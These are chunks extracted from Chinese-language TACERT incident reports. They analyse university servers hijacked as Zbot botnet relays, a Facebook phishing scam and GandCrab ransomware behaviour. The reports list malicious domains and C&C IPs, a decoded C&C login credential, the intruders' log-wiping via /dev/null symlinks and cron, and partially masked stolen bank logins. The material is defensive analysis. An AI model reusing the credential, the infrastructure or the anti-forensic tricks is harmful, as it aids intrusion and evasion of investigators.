特定埠號掃描:除了扮演relay流量的中繼站,192.168.103.148也對許多Class B網域進行5900 port 的掃描,5900 port 主要運行vnc 服務。  分析資料如下列: 192.168.103.148 本機端的網路封包,僅有tcp 部份,分為兩大類:  3 Taiwan Academic",
        "Page_Num": "1,2,3,4"
    },
    "102": {
        "File_Name": "個案分析-C大學的C&C分析報告.pdf",
        "content": "Network Computer emergency Response Team(TACERT)  Nginx Http Proxy 接收與轉送的流量  5900 port Scan 192.168.103.148 本機端特定資料夾以及有關192.168.103.148 主機的資訊  /var/log :空  /home/main :僅有學生實驗資料  /root :駭客掃描工具  /root/.history :空  /etc/passwd :新增的帳號只有main,由學生安裝時所增加  /usr/local/nginx :僅有nginx 設定檔  4 Taiwan Academic Network Computer emergency Response Team(TACERT) Zbot 中繼站分析 在192.168.103.148 本機端pcap 檔,至少可以看到三層的架構,如圖一所示,192.168.103.148 扮 演中繼站(第二層),relay 第一層Zbot 的流量給第三層的85.17.138.133,192.168.103.148 本身沒有 任何web 資料。 這樣的架構使得底層的Zbot 不會有最上層主機的IP,即使下層的Zbot 被抓到了,也只會得到連 線的URL,URL 對應的IP 全部都指向第二層的proxy。Zbot IP List 由於數量眾多,圖一中僅列出部 份。每一個Zbot IP 所連線的Domain 以及URI 都是固定的,Domain 由拿到的PCAP 檔分析,列出如 表一。Domain 所對應的第二層proxy 有數台,C 大學的只是其一。 圖一、relay 資料架構圖 表一、與192.168.103.148 對應的Domain 1 1digitalsmarkets.ru 2 8jl.ru  5 Taiwan Academic Network Computer emergency Response Team(TACERT) 3 9iy.ru 4 axiomhotel.com 5 bibliobonusero.su 6 brainrace.ru 7 clayspheregan.com 8 closerchillaut.su 9 cutenews.net 10 diegosancheze.com 11 ecrxlibgchux.eu 12 emivohngu.ru 13 f53fsa1245.in 14 fudtem.eu 15 g.forsal",
        "Page_Num": "4,5,6"
    },
    "103": {
        "File_Name": "個案分析-C大學的C&C分析報告.pdf",
        "content": ".pl 16 gitasmarkets.ru 17 hightqwalutize.su 18 holiwarikloda.ru 19 hubooyeew.ru 20 indyware.ru 21 izmeritelshop.ru 22 jfdiopv.eu 23 jokerthelrerkomitunglat.ru 24 keyboardbuckse.su 25 maskclub.com 26 modnie-pricheski.ru 27 movescatchats.com 28 neonlioncarfia.su 29 oldairbase.com 30 oposumschoone.com 31 plasticinetec.ru 32 qdqmnmwbykid.eu 33 rjrpexaicsdt.eu 34 secretsvodrah.com 35 slimclock.com 36 spidermanshop.ru 37 tablepack.ru 38 taskdream.com 39 telecurveopora.com 40 tiger-g2.com 41 tripslokabucks.su 42 undircilerdez.com  6 Taiwan Academic Network Computer emergency Response Team(TACERT) 43 virtegelinosea.su 44 vlosgenawsyy.eu 45 wallstreet-fucked.com 46 wardeed.ru 47 wertubublersco.su 48 wrapweb.ru 表一的Doamin 使用fastflux 技術,除了對應到192.168.103.148,也與表二的其他IP(3/1 至3/7 間查詢)輪流對應。 1 124.133.228.122 中國 2 192.168.103.148 台灣 3 208.115.203.138 阿爾巴尼亞 4 208.91.197.54 Virgin Islands (British) 5 209.141.60.202 加拿大 6 217.24.246.7 義大利 7 218.12.4.254 中國 8 221.194.146.109 中國 9 60.19.30.135 中國 表二、與192.168.103.148 同層的proxy 192.168.103.148 使用Nginx 這個套件提供Http Proxy 服務,在Nginx 設定檔裡面,所有的紀錄檔 都已經導向/dev/null,沒有留下任何紀錄檔,僅有Nginx 設定檔。  7 Taiwan Academic Network Computer emergency Response Team(TACERT) 圖二、192.168.103.148 主機的nginx.conf 將",
        "Page_Num": "6,7,8"
    },
    "104": {
        "File_Name": "個案分析-C大學的C&C分析報告.pdf",
        "content": "主機設定為proxy,流量都relay 到85.17.138.133 特定埠號掃描 192.168.103.148 在relay 資料時,也同時大規模掃描多個Class B 網段的5900 埠,圖三僅列出某 部份。在主機裡,也發現/root 下面有掃描的小程式。掃描程式列表如圖四,圖五則是pass_file 的部 份內容,裡面存放了掃描用的弱帳號密碼組合。  8 Taiwan Academic Network Computer emergency Response Team(TACERT) 圖三、192.168.103.148 大規模掃描5900 埠的封包 圖四、置於/root 下的掃描小程式  9 Taiwan Academic Network Computer emergency Response Team(TACERT) 圖五、pass_file 部份內容  10 Taiwan Academic Network Computer emergency Response Team(TACERT) 主機其他資料分析 /var/log 下存放許多紀錄檔,包括使用者登入登出紀錄,在這個部份,和NGINX 服務的紀錄檔一 樣,都已經導向/dev/null,入侵者在紀錄上的抹除上面十分徹底,沒有留下任何「登入」資訊。 lrwxrwxrwx 1 root root 9 2012-03-14 22:47 auth.log -> /dev/null lrwxrwxrwx 1 root root 9 2012-03-14 22:47 btmp.1 -> /dev/null lrwxrwxrwx 1 root root 9 2012-03-14 22:47 lastlog -> /dev/null lrwxrwxrwx 1 root root 9 2012-03-14 22:47 messages -> /dev/null lrwxrwxrwx 1 root root 9 2012-03-14 22:47 secure -> /dev/null lrwxrwxrwx 1 root root 9 2012-03-14 22:47 security -> /dev/null lrwxrwxrwx 1 root root 9 2012-03-14 22:47 utx.lastlogin -> /dev/null lrwxrwxrwx 1 root root 9 2012-03-14 22:47 utx.log -> /dev/null lrwxrwxrwx 1 root root 9 2012-03-14 22:47 wtmp.1 -> /dev/null lrwxrwxrw",
        "Page_Num": "8,9,10,11"
    },
    "105": {
        "File_Name": "個案分析-C大學的C&C分析報告.pdf",
        "content": "x 1 root root 9 2012-03-14 22:47 xferlog -> /dev/null 建議措施  各種遠端連線(SSH、VPN、VNC 等)的帳號密碼建議定時更新  最大權限管理者建議限制遠端登入位址  密碼建議使用英數與特殊符號夾雜  不與其他人分享密碼 調查[1]指出,密碼一直都是資安裡面最弱的一環,有七成以上的網路服務(各種遠端登入、網 路銀行等等)僅使用密碼保護,十個人裡面有四個人至少與一個人共用密碼,許多人使用同一組密碼 登入各種不同的網路服務,有一半以上的使用者從來不使用特殊字元作為密碼,十個裡面有兩個使用 自己的生日或是重要紀念日當密碼(僅有數字),而此事件的入侵手法也是因為主機設定讓root 可以 遠端登入,並且使用弱密碼123,讓駭客輕而易舉取得主機使用權限。 參考 [1] Surprise! Passwords Are (Still) Weak Link in Security Chain http://www.pcworld.com/businesscenter/article/207718/surprise_passwords_are_still_weak_link_in_secu rity_chain.html ",
        "Page_Num": "11"
    },
    "106": {
        "File_Name": "個案分析-C大學的中繼站主機事件分析報告_10502.pdf",
        "content": "個案分析- C 大學的中繼站主機分析報 告 TACERT 臺灣學術網路危機處理中心團隊製 2016/2  1 I. 事件簡介 1. 近期接獲行政院ICST 通報C 大學疑似一台主機 120.X.X.2 感染成為 C&C 中繼站。 2. 該主機是一台windows server 2008 的系所網頁伺服器,主要提供系所 介紹及相關資訊。 3. 此外該主機有啟用FTP 服務供系上老師及學生能夠上傳或下載資料。 4. 該主機同時會占用大量網路頻寬,造成系所對外網路速度不穩。 5. 本單位偕同ICST 前往該大學進行數位鑑識並且側錄主機封包。 II. 事件檢測 1. 從netstat 指令得知,該主機有開啟port 80 及21,分別為 Web service、FTP service 供使用者能夠存取。 2. 從背景程序列表中檢查,PID 2308 的程式 anydesk.exe 疑似是被植入 的軟體,並非使用者安裝。 3. 從封包紀錄中得知,主機會大量向紐西蘭目的端 5.45.75.6 發送大量封 包,主要是透過網域名稱xyz.hulahost.net 進行HTTP POST 連線。傳送 內容包含一些其他遠端主機IP 及PHP 等資訊。  2 4. 透過Virustotal 掃描該網址xyz.hulahost.net,偵測比例為1/66 的惡 意網站。 5. 透過瀏覽器開啟該網址 xyz.hulahost.net 會出現要求輸入帳號密碼的 登入頁面,可能為駭客所使用的一台C&C 主機。  3 6. 此外從主機的網址路徑 http://120.X.X.2/img/log.log 檔案中,發現 到很多紀錄包括了IP、OS 版本、瀏覽器版本及網址等資訊。推論這些可 能是存取過網站 www.molihua.org 的IP 紀錄,並被駭客將資料存放在 120.X.X.2 的web server 中。 7. 封包紀錄中有大量的外部IP 嘗試並且成功存取主機120.X.X.2 的Web service,其中以俄羅斯聯邦的IP 數量最多。路徑為 /csie",
        "Page_Num": "1,2,3,4"
    },
    "107": {
        "File_Name": "個案分析-C大學的中繼站主機事件分析報告_10502.pdf",
        "content": "/CSIE- English/webpages/administrator/index.php,並且使用HTTP POST 方 式成功登入該主機,內容包含了登入帳號及密碼。  4 8. 其次排名第二多的外部IP 為以色列的87.69.165.155,此IP 透過HTTP POST 到 /csie/img/gate.php 所接收,其內容是經過加密過的密文無法 解讀,且payload size 都有3MB 以上,推論可能包含重要的機敏資訊。 在此可以斷定該路徑 /csie/img/ 內容應該就是駭客所植入。 9. 封包紀錄中有觀察到該主機向德國188.40.61.24 下載安裝一個 AnyDesk.exe,該程式雖非惡意程式,但是為遠端桌面控制軟體,且可能 為駭客所用。  5 10. 共345 個相異外部IP 會嘗試向該感染主機下載 /csie/img/csie.exe 執行檔,以法國的5.135.5.113 為最多,不過該 csie.exe 執行檔在側 錄封包期間已經被移除,可能為底層殭屍電腦固定報到用途。 11. 封包紀錄中有來自許多國外IP 的連線,以透過HTTP GET 存取一個 bin 的執行檔案,位置是網站的 /csie/img/csie_vnc.bin。其中以法國 5.135.5.113 存取次數最多,平均間隔20 分鐘下載一次,應為監控主機 存活使用。  6 III. 網路架構圖 俄羅斯 195.206.253.146 C&C中繼站 120.X.X.2 xyz.hulahost.net 紐西蘭 5.45.75.6:80 STEP 2 POST 明文資料 STEP 1 下載惡意程式 anydesk.exe STEP 4 嘗試破解登入WEB 以色列 87.69.165.155 STEP 3 POST 加密機敏 性資料 法國 5.135.5.113 STEP 5 下載監控回報程式 csie.exe 及 csie_vnc.bin 德國 188.40.61.24 駭客 STEP 6 遠端監控 1. 使用者可能下載到惡意程式anydesk.exe 成為駭客的中繼站。 2. 主機",
        "Page_Num": "4,5,6,7"
    },
    "108": {
        "File_Name": "個案分析-C大學的中繼站主機事件分析報告_10502.pdf",
        "content": "感染惡意程式後會向xyz.hulahost.net 傳送底層BOT 的資料。 3. 底層許多BOT 如以色列IP 向中繼站傳送加密過的機敏性資料。 4. 許多外部主機嘗試暴力破解登入中繼站Web 主機的後台。 5. 部分主機如法國 5.135.5.113 持續向中繼站下載惡意檔案csie.exe 和  7 csie_vnc.bin,推斷用來監控中繼站的存活。 IV. 建議與總結 1. 此個案取得資訊大多以側錄封包為主,故只能以網路封包去推論中繼站 的網路行為。 2. 該主機疑似因為HTTP 的漏洞而遭受感染成為C&C 中繼站,並在Web 路徑 資料夾中植入 /img/ 的惡意程式,如gate.php 和cise_vnc.bin。 3. 該主機同時也會下載安裝 anydesk.exe 的遠端控制軟體讓駭客操控。 4. 該中繼站會接收來自底層殭屍電腦的資料,並且向上層發送加密或明文 的資料,加密資料可能包含重要的機敏性資訊。 5. 因為該主機有啟用登入Web 後台頁面,故被大量主機嘗試暴力登入Web 後台。 6. 該主機也被駭客用來暫存其他網站www.molihua.org 的登入紀錄,該網 站主要是反對中國政權的內容議題。 7. 網站管理者要時常檢測Log 紀錄及通訊埠使用情形,以避免遭受駭客入 侵成為C&C 中繼站。 ",
        "Page_Num": "7,8"
    },
    "109": {
        "File_Name": "個案分析-E大學的中繼站個資事件分析報告_10305.pdf",
        "content": "個案分析- E 大學中繼站個資事件分 析報告 TACERT 臺灣學術網路危機處理中心團隊製 2014/05  1 一. 事件簡介 1. 今年二月底接獲通知E大學有主機疑似感染成為C&C 或中繼站, 協同ICST 前往側錄主機流量及資安鑑識。 2. 這台感染主機特性是,持續傳送及接收大量網路流量,導致網 路頻寬壅塞,故判斷可能成為C&C 主機或中繼站。 3. E大學的感染主機IP 是140.X.X.55,是使用Linux 的作業系 統,且為系所研究室的伺服器。 二. 事件檢測 1. 透過側錄主機網路流量封包以觀察其網路行為,藉此判定是否 為C&C 主機或中繼站。 2. 收集主機內的相關系統紀錄,藉此判定有異常的執行程序。 3. 該系統被植入後門的網站伺服器套件Nginx,故連接埠80(http) 和443(https)是被開啟的。故能被用來接收殭屍電腦的資料, 再中繼給C&C 主機。 (1). 連接埠22(ssh)是開啟的,此主機root 的管理權限被設 定能夠遠端ssh 登入,且沒有設定連線來源端網段限制, 可能因此遭受駭客破解登入。 (2). 從Crontab 檔案得知,例行程序會透過指令「killall  2 nginx」定期清除nginx 紀錄。 (3). 檢查發現除了Nginx 之外,sshd 的服務紀錄也都被導入 dev/null,且history 的指令紀錄也被自動清除,為駭客 避免留下登入的線索。 4. 觀察封包可知有許多網域名稱對應到感染主機IP,研判駭客使 用多對一的「Fast-Flux」的動態DNS 轉換技術。這些動態網域 都是用來掩飾中繼站IP 所用,部分特定名稱會有特定用途,如 傳送病毒檔案或個金融資。 Fast-Flux 動態網域名稱 網域名稱 解析出的IP 方式 rangetozthpick.com 140.X.X.55 HTTP defensesun",
        "Page_Num": "1,2,3"
    },
    "110": {
        "File_Name": "個案分析-E大學的中繼站個資事件分析報告_10305.pdf",
        "content": "comp.at 140.X.X.55 HTTP enthusiastsma.com 140.X.X.55 HTTP littwronthath.net 140.X.X.55 HTTP www.littwronthath.net 140.X.X.55 HTTP nss1.primebeauty.net 140.X.X.55 HTTP gefodidnsands.com 140.X.X.55 HTTP saysthnetwork.com 140.X.X.55 HTTP (金融個資) www.primebeauty.net 140.X.X.55 HTTP mailcow.net 140.X.X.55 HTTP reonetedugred.com 140.X.X.55 HTTP (圖片JPG) primebeauty.net 140.X.X.55 HTTP hresellerspasta.com 140.X.X.55 HTTP (惡意程式exe) qqd52ayf1uz.com 140.X.X.55 HTTP pronautmaster.net 140.X.X.55 HTTP (圖片JPG) dsaoe5pr95.net 140.X.X.55 HTTP thnetworkcabl.net 140.X.X.55 HTTP (圖片JPG) ectedsaysitha.com 140.X.X.55 HTTP (圖片JPG)  3 wujieliulan.com 140.X.X.55 HTTP mkjnl.net 140.X.X.55 HTTP test.com 140.X.X.55 HTTP www.pronautmaster.net 140.X.X.55 HTTP (圖片JPG) 共22 個 多網域對一IP 皆使用port 80 5. 從封包紀錄得知,大量的網路流量會連至217.23.8.182,此台 可能為上層的C&C 伺服器,用來接收底層殭屍電腦中繼上來的 資料。 (1). C&C 的IP 位址217.23.8.182 位於紐西蘭,反解析出的網 域名稱為「customer.worldstream.nl」。 (2). 瀏覽器測試該網站,網站運作中卻顯示為空白畫面,應該 為駭客用來收集資料所用。 6. 連至中繼站的底層殭屍電腦至少有3000 個相異IP,全部來自 國外等62 個國家,且排名前三個分別是“德國、",
        "Page_Num": "3,4"
    },
    "111": {
        "File_Name": "個案分析-E大學的中繼站個資事件分析報告_10305.pdf",
        "content": "西班牙、南 非”。  4 61.227.78.144 79.145.126.49 93.128.115.66 188.98.224.105 37.24.150.70 üüüüüü 178.6.115.185 217.15.39.173 178.6.115.185 83.57.29.251 üüüüüü 211.30.51.119 186.147.47.153 63.76.230.133 101.165.218.243 üüüüüü Step 1-1 : POST pronautmaster.net/hez/xsea.php from zbot to 140.X.X.55 Step 1-2 : POST pronautmaster.net/hez/xsea.php from 140.X.X.55 to 217.23.8.182 Step 2-1 : POST littwronthath.net/het/sdgf.php from zbot to 140.X.X.55 Step 2-2 : POST littwronthath.net/het/sdgf.php from 140.X.X.55 to 217.23.8.182 Step 3-1 : POST rangetozthpick.com/ from zbot to 140.X.X.55 Step 3-2 : POST rangetozthpick.com/ from 140.X.X.55 to 217.23.8.182 Step 1-1 Step 2-1 Step 3-1 Step 1-2 Step 2-2 Step 3-2 Zbots Taiwan 中繼站 140.X.X.55 Netherlands C&C 217.23.8.182 üüüüüüüü. HTTP POST 7. 觀察其中一個中繼行為其網域名稱是「saysthnetwork.com」, 由底層主機88.130.24.178 透過中繼站140.X.X.55 向上層C&C 主機 217.23.8.182 要求資料,我們發現都會使用一組帳號密 碼作為認證,封包中的帳密透過Base64 編碼方式加密,密文字 串「YWRtaW5fNDVqZ2hmOkFRNkdVQmNS」經過解密後為 「admin_45jghf:AQ6GUBcR」,也就是帳號密碼分別為, 『admin_45jghf』和『AQ6GUBcR』。  5 (1). 此例底層主機向中繼站做「POST /phpmyadmin//export.php」",
        "Page_Num": "4,5,6"
    },
    "112": {
        "File_Name": "個案分析-E大學的中繼站個資事件分析報告_10305.pdf",
        "content": "後,中繼站立刻也會向C&C 217.23.8.182 做相同的POST 路徑動作。 (2). 待C&C 主機收到中繼站的POST Request 後,從回覆的訊 息中發現許多機密性資訊,例如 「\"id\";\"bot_id\";\"botnet\";\"bot_version\";\"path_source\";\"pa th_dest\";\"time_system\";\"time_tick\";\"time_localbias\";\"os_v ersion\";\"language_id\";\"process_name\";\"process_user\";\"type \";\"context\";\"ipv4\";\"country\";\"rtime\"」的殭屍主機欄位資 訊。 a. 其中process_name 主要是由一隻名叫start.swe 的程式 所執行。 b. 該程式會回傳一些使用者IP 位址及特定網站的登入帳號  6 及密碼,而封包中出現Windows IE 瀏覽器的執行路徑, 研判受害者因為IE 的漏洞而遭竊個資。此特定網站為線 上Hotel 住宿訂房網站。 c. 由以上資訊研判底層主機88.130.24.178 可能為駭客向 C&C 主機索取資料用,利用中繼站當作跳板存取C&C 而非 直接登入,可藏匿於大量殭屍主機之中不易被察覺。 使用者IP 網域 帳號 密碼 網站 195.125.241.27 DE SF_*** Raus***** http://login.bestwestern.com/ 195.125.241.27 DE ST1*** Raus***** http://login.bestwestern.com/ 87.156.30.64 DE ST1*** Raus***** http://login.bestwestern.com/  7 8. 網路封包中得知中繼站主機負責轉送大量的JPG 檔案,主要由 三張不同的圖片構成。經過比對發現此圖在趨勢科技新聞有報 導過可能內藏有金融資訊等個資,透過特殊的資訊隱藏術 (Steganography)將金融資訊隱藏在其中。參考新聞連結: http://www.ithome.com.tw/news/85690 (1). 在此我們透過工具將收集到的部分封包還",
        "Page_Num": "6,7,8"
    },
    "113": {
        "File_Name": "個案分析-E大學的中繼站個資事件分析報告_10305.pdf",
        "content": "原成圖檔做解 析,尚未發現有相關的隱藏資訊或方式,研判只做為殭屍 電腦感染後做報到或暗號使用,或許每張圖對駭客來說有 特殊的意義。因為封包中會記錄原始發送主機IP,以便 透過中繼站之後還能讓C&C 主機能夠得知來源端主機 IP。  8 (2). 第一張風景圖為新聞顯示同一張的夕陽風景圖。 (3). 第二張圖為植物蓮花圖。 (4). 第三張圖為山林的風景圖。  9 9. 此中繼站也會向C&C 接收一些惡意程式執行檔,目前有紀錄到 的檔案為「234089kh.exe」和「kia.exe」這兩種檔案,且都是 透過特定網域名稱「hresellerspasta.com」做傳輸用途,這兩 種檔案使用掃毒軟體檢測確定為惡意程式。 10. 從封包發現有網站登入的資料,經分析還原發現內藏有惡意 程式 cmd.php.exe 執行檔,主要是由下層zbot 德國主機 80.188.76.27 傳至140.X.X.55 後再中繼至上層C&C 主機  10 217.23.8.182。 (1). 將惡意程式「cmd.php.exe」透過Virustotal 掃描後有 11/51 的檢出比例,判別為zbot 木馬程式,原始名稱為 Satloud.exe,目的使感染主機成為殭屍電腦。 (2). 還原出來的程式除了惡意程式之外,還有htm 網頁檔。其 中內容記錄許多收集來的德國各線上銀行的帳戶ID、密 碼、網址及金額等個人資訊,研判許多人的金融帳號密碼 可能已被駭客竊取。 (3). 另有檔案紀錄受害者手機SMS 的發送資訊,包含各IP、 銀行網址、帳號密碼及下載的惡意APK 網址。該網址透過 Virustotal 檢測出的比例卻只有1/53,非常的低。 a. 封包還原後的檔名為「index2.php.htm」,其中前面有 SPAR 和FIDU 這兩個欄位,內容似乎記載了特殊訊息和連 結,但我們無法判斷是什麼意思。",
        "Page_Num": "8,9,10,11"
    },
    "114": {
        "File_Name": "個案分析-E大學的中繼站個資事件分析報告_10305.pdf",
        "content": "另外有個 Success 72h  11 的欄位就較為明顯易懂,記錄了網路銀行連結、帳戶名稱、 密碼及金額等資訊,並且都是以明文方式記錄。 b. 這些網路銀行的所記錄到的都是德國的銀行,若為真的個 人資訊,表示已經相當多人的個資被竊取。  12  13 c. 實際檢查網址確實是銀行的登入頁面,然而我們 並無實地使用以上的帳號密碼做登入測試。 已紀錄的網路銀行網址 國家 https://banking.postbank.de/rai/login 德國 https://bankingportal.kskbitburg-pruem.de 德國 https://bankingportal.sskbo.de 德國 https://banking.lzo.com 德國 https://bankingportal.spk-bbg.de 德國 https://bankingportal.sparkasse-dieburg.de 德國 https://kunde.comdirect.de/lp/wt/login 德國 https://banking.berliner-sparkasse.de 德國  14 d. 封包還原後檔名為「sms.php.htm」,下圖可得知內容放有 手機登入銀行的帳號密碼明文等資訊。例如手機的GPS 經緯度及IP,能讓駭客取得該手機登入的位置。使用的 瀏覽器資訊,例如Firefox。這些手機應該都是遭受特定 惡意程式感染,故欄位中存有惡意APK 的下載連結,但這 些APK 存放的位置為亂數產生的暫存檔,故我們要測試下 載路徑不存在,研判可能安裝了其他軟體於背景下載執行。 另外有個欄位標註為SMS Send: Yes or No,研判應該為 感染後能夠在控制SMS 的發送感染給其他人。  15 三. 網路架構示意圖 Internet Hacker STEP 1 : 電腦感染成為殭屍主機Zbots,並向中繼站透過HTTP或HTTPS方式傳送資料。 STEP 2 : 手機平板感染成為殭屍主機Zbots,也向中繼站透過HTTP方式傳送資料。 STEP 3 : 大量Zbots透過Fast Flux動態網域名稱解析連到中繼站主機群。 STEP 4 : C&C主機",
        "Page_Num": "11,12,13,14,15,16"
    },
    "115": {
        "File_Name": "個案分析-E大學的中繼站個資事件分析報告_10305.pdf",
        "content": "接受來自中繼站140.X.X.55及其他中繼站的中繼資料。 STEP 5 : 駭客可能直接或間接向C&C主機存取偷竊來的資料。 STEP 1 HTTP & HTTPS C&C 主機 217.23.8.182 PC Zbots Phone Zbots STEP 2 HTTP STEP 3 HTTP&HTTPS Relay Servers Fast Flux STEP 4 140.X.X.55 STEP 5 直接存取C&C STEP 5 間接存取C&C  16 四. 結論 1. 此主機遭受駭客植入後門程式,並安裝有問題的Nginx Web Server 套件,主要開啟Port 80 和 443 來中繼資料。 2. 此主機感染為中繼站而非C&C,主要接收來自底層殭屍電腦的 資料,並中繼至上層的C&C 控制命令主機,至少為三階層式的 網路架構。 3. 底層的殭屍電腦除了常見的桌上型電腦外,目前看起來還有來 自智慧型手機(Smart phone)或平板(pad)的設備。 4. 駭客利用了動態網域變更的 Fast Flux 技術,進行多對多的網 域名稱解析,使得網域名稱存活時間不長且真實IP 不易被查 到。 5. 駭客可能利用特殊的資訊隱藏術,將可用資訊藏匿於圖形檔之 中大量傳送及接收。 6. 有觀察到此主機駭客所傳遞的網路銀行個資,表示國外確實有 大量的使用者金融個資外洩,有此推論遭受感染的電腦或手機 資料都可能遭竊。 五. 建議措施 1. 管理者的密碼複雜度要加強,並且避免最高權限帳號能夠透過  17 遠端登入。 2. 限制遠端來源端的登入網段IP,並加強防火牆規則並時常更新 修補作業系統漏洞。 3. 時常透過指令netstat 方式查看是否有可疑通訊埠被開啟或連 線,當有大量網路流量產生時可能就是主機已遭受感染。 4. 檢查CPU 或記憶體使用率是否一直很高,可能為惡意程式所 為。 ",
        "Page_Num": "16,17,18"
    },
    "116": {
        "File_Name": "個案分析-Facebook常見惡意網址之『linkee.com』_10301.pdf",
        "content": "個案分析- Facebook 常見惡意網址之 『linkee.com』事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2014/01  1 I. 前言: A. 現今Facebook (簡稱FB)已為世界知名且最多人使用的網路社交軟體,但 是近期出現一些惡意的網址或程式在Facebook 流竄,若不小心開啟可能 嚴重侵害到個人或者他人的權益,導致個人資料外洩或者成為一個BOT 危害其他FB 使用者。 B. 駭客往往喜歡使用聳動的影片標題去誘使FB 使用者去點開連結觀看。 C. 因此我們嘗試去開啟執行這些疑似惡意程式,並將受感染的過程及結果做 個簡單的說明。 D. 我們用一個新創的FB 帳號對近期出現的可疑連結做測試。 II. 測試環境: A. VMware: Win7(x64) B. 瀏覽器版本: Google Chrome C. 創立一個測試用空白的FB 帳戶去開啟惡意連結。 III. 測試過程: A. 在FB 上搜尋到一個使用者Rakib 在他人的發文中做留言,此留言只有一 串可疑網址 http://linkee.com/VmFE0j,初步判斷為惡意連結。 B. 再點下該網址後FB 跳出一個警告視窗,表示此網站可能不安全,我們點 選非垃圾訊息觀察會出現什麼畫面。 C. 此時會出現一個頁面 “http://tknngl.altervista.org” 要求做Age Verification,  2 並有教學圖示引導受害者跟著做,看到這邊有警覺心的人應該就會發現是 個釣魚網站。 1. 此頁面原始碼會執行\"http://j.maxmind.com/app/geoip.js\" 收集受害者 IP 資訊。 2. 第一步執行完果然跳出一個小視窗,內容還會顯示安全警告告知受害 者保護此Activation code,但實際上是背景執行一支javascript。裡面 隱含了FB 登入成功的密鑰字串,部分為 /login_success.html? 應為登 入密碼。 3. 第二步複製以上網址後再貼到下方的Activation code 欄位,並點下方 的Activate 圖示。 4. ",
        "Page_Num": "1,2,3"
    },
    "117": {
        "File_Name": "個案分析-Facebook常見惡意網址之『linkee.com』_10301.pdf",
        "content": "接著會出現一個畫面顯示 “Wait We Are Verifying Your Age..”的訊息。  3 5. 接著會出現網址“http://buzzingcl.info/cl/twfbd”的頁面顯示 “Waiting for survey completion”,此時FB 帳號已經被入侵了,然而背景的 Youtube 根本無法點選撥放,只是一個偽造的圖案。 6. 若點選 “Click here to see if you’re a winner” 則會跳出另視窗 “rewardzone.onlineacutions.com” 告知可以獲得3C 產品,因明顯為釣 魚網站,故此網頁我們則無繼續點選。  4 IV. 測試結果: A. 我們發現到個人的動態時報開始出現奇怪的發文和不雅照片,且照片的說 明即為另一網址連結,誘導使用者好奇去點取以觀看該影片。(截圖經過 馬賽克處理) B. 受害者FB 會自動去追蹤其他使用者或發出交友邀請。  5 C. 受害者FB 會自動對某些 “粉絲專頁” 按讚,以訂閱他們奇怪的文章。 D. 若將剛自行發布的成人照片網址開啟,則又會跳到 “tknngl.altervista.org” 的相同釣魚頁面,目的誘使其他觀看者上鉤,成為另一受害者。 E. 有些發過的圖文離奇的被移除,但從FB 的登入IP 紀錄來看為正常。 1. 在之後從新登入FB 被官方偵測有異常行為,主要是散佈一些垃圾訊 息。 2. FB 官方提出下列警告果然就是相同作法將自己的登入權限外放讓第 三者使用。  6 V. 解決方式: A. 刪除瀏覽器Facebook 的所有cookie。 B. 刪除FB 所發布的任何文章,取消相關按讚的專業訂閱。 C. 刪除自動發出的交友邀請。 D. 盡快更改FB 的密碼,建議使用兩次驗證機制。 VI. 結論建議: A. 此惡意連結並非出現FB 啟動應用程式中。 B. 會自動散步惡意貼文以及標註朋友,且FB 的個資可能已經外洩。 C. Facebook 上時常會有朋友分享一些影音連結,不確定的網址連結請勿輕 易打開,",
        "Page_Num": "3,4,5,6,7"
    },
    "118": {
        "File_Name": "個案分析-Facebook常見惡意網址之『linkee.com』_10301.pdf",
        "content": "多半會用短縮網址方式顯示來轉址,使人看不出來真正位址。 D. 加強FB 帳號安全設定,例如使用安全驗證碼登入功能。 (手機驗證或二次驗證碼) E. 盡量避免使用瀏覽器自動記憶密碼登入功能。 ",
        "Page_Num": "7"
    },
    "119": {
        "File_Name": "個案分析-GandCrab勒索病毒攻擊事件分析報告_10709.pdf",
        "content": "個案分析- GandCrab 勒索病毒攻擊 事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 107 年9 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 從2018 年1 月勒索病毒GandCrab 被發現開始,至2018 年7 月,短短半年 期間GandCrab 病毒已更新版本至V4 版,此勒索病毒的變種產生速度極快, 已成為2018 年上半年最惡名遠播的勒索病毒。 2. GandCrab 病毒厲害之處在於其多元化傳播、躲避偵測能力強與加密工具強, 其每個版本間基本變化不大,主要是傳播方式越來越靈活與多元化,除了利 用釣魚信件外,也會駭入合法網站去嵌入偽造的網頁連結,再誘導使用者下 載惡意軟體。 3. GandCrab 病毒在2018 年2 月時加密文件副檔名為.GDCB,最近V4 版 是.KRAB,而且加密工具由RSA-2048 轉為更快的Salsa20 stream cipher。 4. 為實際了解GandCrab 勒索病毒感染受害主機後之系統行為與網路行為,本 中心取得該病毒樣本後進行實機檢測。 II. 事件檢測 1. 首先,使用2 台安裝Windows 7 系統的VM 虛擬主機進行隔離環境測試,兩 台主機在同一個區域網路內,分別為Ruby-PC 與Scott-PC,其中Ruby-PC 有 設定連接Scott-PC 之ShareDoc 資料夾的網路磁碟機,而惡意程式樣本為 GC43.exe,將它放於Ruby-PC 上執行。 2. 程式GC43.exe 執行後,發現原本開啟的Word、Excel、PowerPointer 等執行 檔被關閉了。檢視該GC43.exe 的程式碼,發現該病毒為了確保目標文件可以 完全被加密,會主動關閉許多常用應用程式的程序,如Office、瀏覽器或是 資料庫等,以確保加密檔案攻擊不會意外地被中斷,它會關閉的程序如下:  2 臺灣學術網路危機處理中心",
        "Page_Num": "1,2,3"
    },
    "120": {
        "File_Name": "個案分析-GandCrab勒索病毒攻擊事件分析報告_10709.pdf",
        "content": "(TACERT) TANet Computer Emergency Response Team msftesql.exe、sqlagent.exe、sqlbrowser.exe、sqlwriter.exe、oracle.exe、ocssd.exe、 dbsnmp.exe、synctime.exe、agntsvc.exe、isqlplussvc.exe、xfssvccon.exe、 sqlservr.exe、mydesktopservice.exe、ocautoupds.exe、agntsvc.exe、encsvc.exe、 firefoxconfig.exe、tbirdconfig.exe、mydesktoppqos.exe、ocomm.exe、 mysqld.exe、dbeng50.exe、sqbcoreservice.exe、excel.exe、infopath.exe、 msaccess.exe、mspub.exe、onenote.exe、outlook.exe、powerpnt.exe、steam.exe、 thebat.exe、thebat64.exe、thunderbird.exe、vision.exe、winword.exe 與 wordpad.exe 等。 3. 觀察Ruby-PC 主機對外網路連線情況,發現程式GC43.exe 執行時,會大量 對外持續連線一些不知名的網站主機,其中所連線的目的主機有3 台在學術  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 網路中,分別為IP:163.28.5.19、163.28.228.9 與163.28.228.11。  4 